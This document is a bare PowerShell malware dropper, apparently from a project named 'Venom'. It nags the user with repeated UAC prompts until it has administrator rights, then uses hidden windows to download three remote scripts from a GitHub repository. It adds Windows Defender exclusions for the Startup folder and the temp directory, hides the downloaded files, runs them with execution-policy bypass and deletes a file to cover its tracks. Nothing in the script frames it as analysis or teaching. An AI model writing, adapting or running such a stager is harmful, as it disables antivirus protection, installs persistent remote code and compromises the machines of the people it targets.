$maxAttempts = 7
$attempt = 1

Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

# Loop until admin or max attempts
while ($attempt -le $maxAttempts) {
    # Check if already admin
    $isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    if ($isAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { break }

    # Relaunch with UAC prompt
    Start-Process -FilePath "powershell" -ArgumentList "-File `"$PSCommandPath`"" -Verb RunAs
    $attempt++
    Start-Sleep -Seconds 5
}

if ($attempt -gt $maxAttempts) { exit } # Exit if failed

powershell -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer1.ps1 -OutFile BVrAihDwJNvc.ps1; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'

powershell -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/AutoRun.bat -OutFile nEQlCzTBpDrO.bat; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'

powershell -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/p_vba.ps1 -OutFile AmJOwiWzUEbZ.ps1; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'


attrib +h "%STARTUP%/nEQlCzTBpDrO.bat"

attrib +h "%STARTUP%/AmJOwiWzUEbZ.ps1"

attrib +h "%STARTUP%/BVrAihDwJNvc.ps1"

powershell powershell.exe -windowstyle hidden -ep bypass "./BVrAihDwJNvc.ps1"

powershell powershell.exe -windowstyle hidden -ep bypass "./AmJOwiWzUEbZ.ps1"

del IVbaANzwiphH.ps1
